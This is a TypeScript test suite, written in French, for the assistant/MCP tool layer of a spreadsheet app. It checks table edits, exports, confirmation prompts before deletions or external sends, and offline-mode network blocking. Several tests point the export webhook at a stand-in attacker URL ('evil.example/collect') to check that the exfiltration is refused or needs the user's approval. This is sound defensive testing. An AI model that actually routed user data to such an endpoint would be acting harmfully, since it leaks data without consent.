import { afterEach, describe, expect, it } from 'vitest'
import { createDemoData } from '@/fixtures/demo'
import { createHeadlessSession, type HeadlessOptions, type HeadlessSession } from '../headless'
import { runTool, toolSchemas, type ConfirmRequest } from '../tools'

let session: HeadlessSession | null = null
const saved: { name: string; content: string; path?: string }[] = []

/** Hôte d'outils ; par défaut un client MCP (Claude Code confirme lui-même chaque appel). */
function open(options: HeadlessOptions = { caller: 'mcp' }) {
  saved.length = 0
  session = createHeadlessSession(
    createDemoData(),
    async (name, content, _mime, path) => {
      saved.push({ name, content, path })
      return path ?? `/exports/${name}`
    },
    options,
  )
  return session
}
afterEach(() => session?.dispose())

async function call(name: string, args: unknown = {}) {
  const res = await runTool(name, args, session!.host)
  return { ...res, json: res.ok ? JSON.parse(res.content) : undefined }
}

describe('définitions', () => {
  it('produit un schéma JSON pour chaque outil', () => {
    const schemas = toolSchemas()
    expect(schemas.map((s) => s.name)).toEqual([
      'list_tables',
      'read_table',
      'set_cells',
      'add_rows',
      'delete_rows',
      'add_column',
      'update_column',
      'delete_column',
      'create_project',
      'create_table',
      'rename',
      'evaluate',
      'get_settings',
      'check_export',
      'configure_export',
      'export_table',
    ])
    const setCells = schemas.find((s) => s.name === 'set_cells')!
    expect(setCells.parameters).toMatchObject({ type: 'object', required: ['table', 'cells'] })
    expect(JSON.stringify(schemas)).not.toContain('$schema')
  })

  it('get_settings lit le mode « En ligne » sans pouvoir le changer', async () => {
    const data = createDemoData()
    const session = createHeadlessSession(data, async () => '', { caller: 'mcp' })
    try {
      const off = await runTool('get_settings', {}, session.host)
      expect(JSON.parse(off.content)).toMatchObject({ online_mode: false, mode: 'Hors ligne' })
      session.host.store.getState().setOnlineMode(true)
      const on = await runTool('get_settings', { online_mode: false }, session.host)
      expect(JSON.parse(on.content)).toMatchObject({ online_mode: true })
      // Les arguments sont ignorés : l'outil ne change rien.
      expect(session.host.store.getState().preferences.onlineMode).toBe(true)
    } finally {
      session.dispose()
    }
  })

  it('get_settings ne prétend plus que « rien ne quitte la machine » hors ligne', () => {
    const def = toolSchemas().find((t) => t.name === 'get_settings')!
    expect(def.description).not.toMatch(/rien ne quitte la machine/)
    expect(def.description).toMatch(/aucun envoi n’est fait vers une adresse extérieure/)
    expect(def.description).toMatch(/cette machine \(Atelier Projets local\) restent possibles/)
  })
})

describe('lecture', () => {
  it('liste les espaces, projets et tables', async () => {
    open()
    const { json } = await call('list_tables')
    expect(json.workspaces[0].projects[0].tables.map((t: { name: string }) => t.name)).toEqual([
      'Budget Global',
      'Planning & Lots',
      'Calculs Surfaces',
    ])
    expect(json.collaborators).toHaveLength(3)
  })

  it('lit une table par son nom, avec valeurs calculées et formules', async () => {
    open()
    const { json } = await call('read_table', { table: 'planning & lots' })
    expect(json.columns[3]).toEqual({
      letter: 'D',
      id: 'cost_ttc',
      label: 'Coût TTC',
      type: 'formula',
      formula: '=C1*1.2',
      format: 'currency',
      mapping: 'financial_ttc',
    })
    expect(json.rows[0]).toEqual({
      row: 1,
      id: 'rec_01',
      cells: {
        A: 'Gros œuvre',
        B: 'En cours',
        C: 45000,
        D: 54000,
        E: 'Marie Dubois',
        F: '2026-11-30',
      },
    })
    expect(json.rows[3]).toMatchObject({ row: 4, total_row: true, formulas: { C: '=SUM(C1:C3)' } })
    expect(json.column_sums).toEqual({ C: 88500, D: 106200 })
  })

  it('aide l’IA à se corriger quand une référence est fausse', async () => {
    open()
    const res = await call('read_table', { table: 'Planning' })
    expect(res.ok).toBe(false)
    expect(res.content).toContain('« Planning & Lots » (tbl_planning_lots)')
  })

  it('calcule une formule sans rien modifier', async () => {
    open()
    const { json } = await call('evaluate', {
      table: 'tbl_planning_lots',
      formula: 'AVERAGE(C1:C3)',
    })
    expect(json).toEqual({ formula: '=AVERAGE(C1:C3)', value: 29500 })
  })
})

describe('modification', () => {
  it('modifie des cellules avec les règles de saisie de la grille', async () => {
    open()
    const { json } = await call('set_cells', {
      table: 'Planning & Lots',
      cells: [
        { row: 3, column: 'Coût HT', value: '20 000 €' },
        { row: 3, column: 'B', value: 'en cours' },
        { row: 'rec_02', column: 'Échéance', value: '01/02/2027' },
      ],
    })
    expect(json.updated).toEqual([
      { cell: 'C3', value: 20000 },
      { cell: 'B3', value: 'En cours' },
      { cell: 'F2', value: '2027-02-01' },
    ])
    const after = await call('read_table', { table: 'tbl_planning_lots' })
    expect(after.json.rows[3].cells.D).toBe(112200)
  })

  it('refuse une valeur invalide sans rien modifier', async () => {
    open()
    const res = await call('set_cells', {
      table: 'tbl_planning_lots',
      cells: [
        { row: 1, column: 'C', value: 1 },
        { row: 2, column: 'Statut', value: 'Livré' },
      ],
    })
    expect(res.ok).toBe(false)
    expect(res.content).toContain(
      'Choix possibles : À faire, En cours, En revue, En attente, Bloquée, Résolue, Terminée, Rejetée',
    )
    const after = await call('read_table', { table: 'tbl_planning_lots' })
    expect(after.json.rows[0].cells.C).toBe(45000)
  })

  it('ajoute des lignes au-dessus du total', async () => {
    open()
    const { json } = await call('add_rows', {
      table: 'Planning & Lots',
      rows: [
        { 'Lot / Tâche': 'Menuiseries', C: 12000, Statut: 'À faire', Responsable: 'KB' },
        { A: 'Peintures', C: '8 500' },
      ],
    })
    expect(json.added.map((r: { row: number }) => r.row)).toEqual([4, 5])
    expect(json.added[0].cells).toMatchObject({ D: 14400, E: 'Karim Benali' })
    const after = await call('read_table', { table: 'Planning & Lots' })
    expect(after.json.rows[5]).toMatchObject({ total_row: true, formulas: { C: '=SUM(C1:C5)' } })
    expect(after.json.rows[5].cells.C).toBe(109000)
  })

  it('supprime des lignes', async () => {
    open()
    const { json } = await call('delete_rows', { table: 'Planning & Lots', rows: [1, 'rec_02'] })
    expect(json).toEqual({ deleted: 2, remaining_rows: 2 })
  })

  it('ajoute, modifie et supprime une colonne formule', async () => {
    open()
    const added = await call('add_column', {
      table: 'Planning & Lots',
      label: 'Marge',
      type: 'formula',
      formula: 'D1-C1',
      format: 'currency',
      position: 'E',
    })
    expect(added.json.added).toMatchObject({ letter: 'E', label: 'Marge', formula: '=D1-C1' })
    const read = await call('read_table', { table: 'Planning & Lots' })
    expect(read.json.rows[1].cells.E).toBe(5700)
    expect(read.json.columns[5].label).toBe('Responsable')

    const upd = await call('update_column', {
      table: 'Planning & Lots',
      column: 'Marge',
      label: 'Marge TVA',
      formula: '=ROUND(D1-C1, 0)',
    })
    expect(upd.json.updated).toMatchObject({ label: 'Marge TVA', formula: '=ROUND(D1-C1, 0)' })

    const del = await call('delete_column', { table: 'Planning & Lots', column: 'Marge TVA' })
    expect(del.json).toEqual({ deleted: 'Marge TVA' })
  })

  it('refuse une formule invalide', async () => {
    open()
    const res = await call('add_column', {
      table: 'Planning & Lots',
      label: 'X',
      type: 'formula',
      formula: '=SUM(C1',
    })
    expect(res.ok).toBe(false)
    expect(res.content).toMatch(/Formule invalide/)
  })

  it('met à jour les statuts en gardant ceux des lignes', async () => {
    open()
    await call('update_column', {
      table: 'Planning & Lots',
      column: 'Statut',
      choices: ['À faire', 'En cours', 'Terminée', 'Réceptionné'],
    })
    const read = await call('read_table', { table: 'Planning & Lots' })
    expect(read.json.columns[1].choices).toEqual(['À faire', 'En cours', 'Terminée', 'Réceptionné'])
    expect(read.json.rows[1].cells.B).toBe('Terminée')
  })

  it('crée un projet et une table avec ses colonnes', async () => {
    open()
    const proj = await call('create_project', {
      workspace: 'Espace Ingénierie',
      name: 'Extension école',
    })
    expect(proj.json.project_id).toMatch(/^proj_/)
    const tbl = await call('create_table', {
      project: 'Extension école',
      name: 'Devis',
      columns: [
        { label: 'Poste', type: 'text' },
        { label: 'HT', type: 'currency', mapping: 'financial_ht' },
        {
          label: 'TTC',
          type: 'formula',
          formula: '=B1*1.2',
          format: 'currency',
          mapping: 'financial_ttc',
        },
      ],
    })
    expect(
      tbl.json.columns.map((c: { letter: string; label: string }) => `${c.letter} ${c.label}`),
    ).toEqual(['A Poste', 'B HT', 'C TTC'])
    expect(tbl.json.columns[0].mapping).toBe('entity_title')
    await call('add_rows', { table: 'Devis', rows: [{ Poste: 'Fondations', HT: 1000 }] })
    const read = await call('read_table', { table: 'Devis' })
    expect(read.json.rows).toEqual([
      { row: 1, id: expect.any(String), cells: { A: 'Fondations', B: 1000, C: 1200 } },
    ])
  })

  it('renomme', async () => {
    open()
    await call('rename', { kind: 'table', target: 'Budget Global', name: 'Budget 2026' })
    const { json } = await call('list_tables')
    expect(json.workspaces[0].projects[0].tables[0].name).toBe('Budget 2026')
  })

  it('valide les arguments', async () => {
    open()
    const res = await call('set_cells', { table: 'Planning & Lots' })
    expect(res.ok).toBe(false)
    expect(res.content).toMatch(/Arguments invalides pour set_cells : cells/)
    expect((await call('outil_bidon')).content).toMatch(/Outil inconnu/)
  })
})

describe('statuts de la Suite Atelier', () => {
  it('ajoute une colonne avec le préréglage « Statuts Atelier »', async () => {
    open()
    const { json } = await call('add_column', {
      table: 'Matériaux',
      label: 'Avancement',
      type: 'select',
      preset: 'atelier',
    })
    expect(json.added.choices).toEqual([
      'À faire',
      'En cours',
      'En revue',
      'En attente',
      'Bloquée',
      'Résolue',
      'Terminée',
      'Rejetée',
    ])
    const set = await call('set_cells', {
      table: 'Matériaux',
      cells: [{ row: 1, column: 'Avancement', value: 'Fait' }],
    })
    expect(set.json.updated[0].value).toBe('Terminée')
  })

  it('applique le préréglage à une colonne existante sans perdre les valeurs', async () => {
    open()
    await call('update_column', {
      table: 'Planning & Lots',
      column: 'Statut',
      choices: ['À faire', 'En cours', 'Validé', 'Bloqué'],
    })
    await call('set_cells', {
      table: 'Planning & Lots',
      cells: [
        { row: 1, column: 'B', value: 'Validé' },
        { row: 2, column: 'B', value: 'Bloqué' },
      ],
    })
    const { json } = await call('update_column', {
      table: 'Planning & Lots',
      column: 'Statut',
      preset: 'atelier',
    })
    expect(json.updated.choices).toEqual([
      'À faire',
      'En cours',
      'En revue',
      'En attente',
      'Bloquée',
      'Résolue',
      'Terminée',
      'Rejetée',
      'Validé',
    ])
    const read = await call('read_table', { table: 'Planning & Lots' })
    expect(read.json.rows.slice(0, 3).map((r: { cells: { B: string } }) => r.cells.B)).toEqual([
      'Validé',
      'Bloquée',
      'À faire',
    ])
  })

  it('refuse le préréglage hors colonne de statut', async () => {
    open()
    const res = await call('add_column', {
      table: 'Matériaux',
      label: 'X',
      type: 'text',
      preset: 'atelier',
    })
    expect(res.ok).toBe(false)
    expect(res.content).toMatch(/type select/)
  })

  it('un libellé de statut reconnu prend la teinte officielle', async () => {
    open()
    await call('add_column', {
      table: 'Matériaux',
      label: 'Suivi',
      type: 'select',
      choices: ['Réceptionné', 'Rejeté', 'En revue'],
    })
    const table = session!.snapshot().tables.tbl_materiaux!
    const field = Object.values(table.fields).find((f) => f.label === 'Suivi')!
    expect(field.options?.choices?.map((c) => c.color)).toEqual(['gray', 'red', 'violet'])
  })
})

describe('export', () => {
  it('vérifie une table', async () => {
    open()
    const { json } = await call('check_export', { table: 'Planning & Lots' })
    expect(json).toMatchObject({
      status: 'ready',
      records: 3,
      computed_totals: { C: 88500, D: 106200 },
    })
  })

  it('exporte en JSON et journalise l’export', async () => {
    open()
    const { json } = await call('export_table', {
      table: 'Planning & Lots',
      format: 'json',
      rows: [2],
    })
    expect(json.message).toBe('1 ligne(s) exportée(s) en JSON')
    expect(saved[0]?.name).toMatch(/^atelier_projets_planning-lots_\d{4}-\d{2}-\d{2}\.json$/)
    expect(JSON.parse(saved[0]!.content).project.records[0].record_id).toBe('rec_02')
    expect(session!.snapshot().integrations.atelierProjets.lastExport?.ok).toBe(true)
  })

  it('refuse un webhook non configuré', async () => {
    open()
    const res = await call('export_table', { table: 'Planning & Lots', format: 'webhook' })
    expect(res.ok).toBe(false)
    expect(res.content).toMatch(/Aucun webhook configuré/)
    expect(res.content).toContain('http://127.0.0.1:3000/api/imports/atelier-tab')
  })

  it('configure le préréglage Atelier Projets et le projet cible', async () => {
    open()
    expect((await call('configure_export')).json).toEqual({
      webhook_url: null,
      atelier_projets: false,
      project_id: null,
      send_url: null,
    })
    const { json } = await call('configure_export', {
      preset: 'atelier-projets-local',
      project_id: 3,
    })
    expect(json).toEqual({
      webhook_url: 'http://127.0.0.1:3000/api/imports/atelier-tab',
      atelier_projets: true,
      project_id: '3',
      send_url: 'http://127.0.0.1:3000/api/imports/atelier-tab?projectId=3',
    })
    expect((await call('configure_export', { url: 'http://exemple.fr/hook' })).ok).toBe(false)
    expect((await call('configure_export', { project_id: '' })).json.project_id).toBeNull()
  })

  it('envoie à Atelier Projets et renvoie son résumé', async () => {
    open()
    const sent: string[] = []
    session!.host.webhookFetch = async (url) => {
      sent.push(url)
      return {
        ok: true,
        status: 200,
        text: async () =>
          JSON.stringify({ projectId: 3, created: 3, updated: 0, skipped: 0, warnings: [] }),
      }
    }
    await call('configure_export', { preset: 'atelier-projets-local', project_id: '3' })
    const { json } = await call('export_table', { table: 'Planning & Lots', format: 'webhook' })
    expect(sent).toEqual(['http://127.0.0.1:3000/api/imports/atelier-tab?projectId=3'])
    expect(json.message).toBe('3 ligne(s) envoyée(s) — Atelier Projets : 3 créés')
    expect(json.atelier_projets).toMatchObject({ projectId: 3, created: 3, warnings: [] })
  })
})

/** Faux transport webhook : mémorise les envois. */
function recordSends(s: HeadlessSession) {
  const sent: { url: string; headers: Record<string, string>; redirect: string }[] = []
  s.host.webhookFetch = async (url, init) => {
    sent.push({ url, headers: init.headers, redirect: init.redirect })
    return { ok: true, status: 200, text: async () => '{}' }
  }
  return sent
}

/** Confirmations simulées : mémorise les demandes, répond `answer`. */
function confirmer(answer: boolean) {
  const asked: ConfirmRequest[] = []
  return {
    asked,
    confirm: async (r: ConfirmRequest) => {
      asked.push(r)
      return answer
    },
  }
}

describe('garde-fous de l’assistant (SUITE.md §5.4)', () => {
  it('suppression de lignes : confirmation demandée, rien n’est supprimé sans accord', async () => {
    const no = confirmer(false)
    open({ caller: 'assistant', confirm: no.confirm })
    const res = await call('delete_rows', { table: 'Planning & Lots', rows: [1, 2] })
    expect(res.ok).toBe(false)
    expect(res.content).toMatch(/Refusé par l’utilisateur : rien n’a été fait/)
    expect(no.asked).toEqual([
      expect.objectContaining({
        tool: 'delete_rows',
        kind: 'delete',
        message: 'L’assistant veut supprimer 2 lignes (1, 2) de « Planning & Lots ».',
      }),
    ])
    expect(session!.snapshot().tables.tbl_planning_lots?.rowOrder).toHaveLength(4)

    const yes = confirmer(true)
    open({ caller: 'assistant', confirm: yes.confirm })
    expect((await call('delete_rows', { table: 'Planning & Lots', rows: [1] })).ok).toBe(true)
    expect(session!.snapshot().tables.tbl_planning_lots?.rowOrder).toHaveLength(3)
  })

  it('suppression de colonne : confirmation demandée ; sans moyen de confirmer, refusée', async () => {
    open({ caller: 'assistant' })
    const res = await call('delete_column', { table: 'Planning & Lots', column: 'Échéance' })
    expect(res.ok).toBe(false)
    expect(res.content).toMatch(/demande la confirmation de l’utilisateur/)
    expect(session!.snapshot().tables.tbl_planning_lots?.fields.due_date).toBeDefined()

    const yes = confirmer(true)
    open({ caller: 'assistant', confirm: yes.confirm })
    expect((await call('delete_column', { table: 'Planning & Lots', column: 'F' })).ok).toBe(true)
    expect(yes.asked[0]?.message).toBe(
      'L’assistant veut supprimer la colonne F « Échéance » de « Planning & Lots » et toutes ses valeurs.',
    )
  })

  it('configure_export : bouclage sans confirmation ; ailleurs, refusé hors ligne, confirmé en ligne', async () => {
    const no = confirmer(false)
    open({ caller: 'assistant', confirm: no.confirm })
    expect((await call('configure_export', { preset: 'atelier-projets-local' })).ok).toBe(true)
    expect((await call('configure_export', { url: 'http://localhost:3000/hook' })).ok).toBe(true)
    expect(no.asked).toEqual([])

    // Hors ligne : refusé d'emblée, sans même demander.
    const offline = await call('configure_export', { url: 'https://evil.example/collect' })
    expect(offline.ok).toBe(false)
    expect(offline.content).toMatch(/Mode hors ligne : envoi vers evil\.example refusé/)
    expect(no.asked).toEqual([])

    // En ligne : l'utilisateur refuse → adresse inchangée.
    session!.host.store.getState().setOnlineMode(true)
    const refused = await call('configure_export', { url: 'https://evil.example/collect' })
    expect(refused.ok).toBe(false)
    expect(no.asked[0]).toMatchObject({
      tool: 'configure_export',
      kind: 'configure',
      url: 'https://evil.example/collect',
    })
    expect(session!.snapshot().integrations.atelierProjets.webhookUrl).toBe(
      'http://localhost:3000/hook',
    )

    const yes = confirmer(true)
    open({ caller: 'assistant', confirm: yes.confirm })
    session!.host.store.getState().setOnlineMode(true)
    expect((await call('configure_export', { url: 'https://partenaire.example/api' })).ok).toBe(
      true,
    )
    expect(session!.snapshot().integrations.atelierProjets.webhookUrl).toBe(
      'https://partenaire.example/api',
    )
  })

  it('export_table vers une adresse extérieure : confirmation à chaque envoi, rien ne part sans', async () => {
    const no = confirmer(false)
    open({ caller: 'assistant', confirm: no.confirm })
    const s = session!
    const sent = recordSends(s)
    // Adresse réglée par l'utilisateur dans le dialogue d'export, mode en ligne.
    s.host.store.getState().setAtelierIntegration({
      webhookUrl: 'https://partenaire.example/api',
      token: 'jeton-projets',
    })
    s.host.store.getState().setOnlineMode(true)
    const res = await call('export_table', { table: 'Planning & Lots', format: 'webhook' })
    expect(res.ok).toBe(false)
    expect(sent).toEqual([])
    expect(no.asked[0]).toMatchObject({
      tool: 'export_table',
      kind: 'send',
      url: 'https://partenaire.example/api',
      message:
        'L’assistant veut envoyer 3 lignes de « Planning & Lots » vers https://partenaire.example/api, hors de cet ordinateur.',
    })

    const yes = confirmer(true)
    s.host.confirm = yes.confirm
    expect((await call('export_table', { table: 'Planning & Lots', format: 'webhook' })).ok).toBe(
      true,
    )
    // Envoyé après accord, sans le jeton (réservé à Atelier Projets local), sans redirection.
    expect(sent).toHaveLength(1)
    expect(sent[0]?.headers.Authorization).toBeUndefined()
    expect(sent[0]?.redirect).toBe('error')
  })

  it('export_table vers Atelier Projets local : ni confirmation ni blocage hors ligne, jeton joint', async () => {
    const no = confirmer(false)
    open({ caller: 'assistant', confirm: no.confirm })
    const sent = recordSends(session!)
    session!.host.store.getState().setAtelierIntegration({ token: 'jeton-projets' })
    await call('configure_export', { preset: 'atelier-projets-local' })
    expect((await call('export_table', { table: 'Planning & Lots', format: 'webhook' })).ok).toBe(
      true,
    )
    expect(no.asked).toEqual([])
    expect(sent[0]?.headers.Authorization).toBe('Bearer jeton-projets')
  })
})

describe('politique réseau, quel que soit l’appelant (MCP compris)', () => {
  it('hors ligne : aucun envoi vers une adresse extérieure', async () => {
    open({ caller: 'mcp' })
    const sent = recordSends(session!)
    session!.host.store.getState().setAtelierIntegration({ webhookUrl: 'https://evil.example/x' })
    const res = await call('export_table', { table: 'Planning & Lots', format: 'webhook' })
    expect(res.ok).toBe(false)
    expect(res.content).toMatch(/Mode hors ligne : envoi vers evil\.example refusé/)
    expect(sent).toEqual([])
  })

  it('le jeton ne part que vers la route d’import d’Atelier Projets locale', async () => {
    open({ caller: 'mcp' })
    const sent = recordSends(session!)
    const s = session!.host.store.getState()
    s.setOnlineMode(true)
    s.setAtelierIntegration({ token: 'jeton-projets' })
    for (const webhookUrl of [
      'http://127.0.0.1:3000/api/imports/atelier-tab',
      'https://projets.example/api/imports/atelier-tab',
      'http://127.0.0.1:3000/autre',
    ]) {
      s.setAtelierIntegration({ webhookUrl })
      expect((await call('export_table', { table: 'Planning & Lots', format: 'webhook' })).ok).toBe(
        true,
      )
    }
    expect(sent.map((e) => e.headers.Authorization)).toEqual([
      'Bearer jeton-projets',
      undefined,
      undefined,
    ])
  })
})
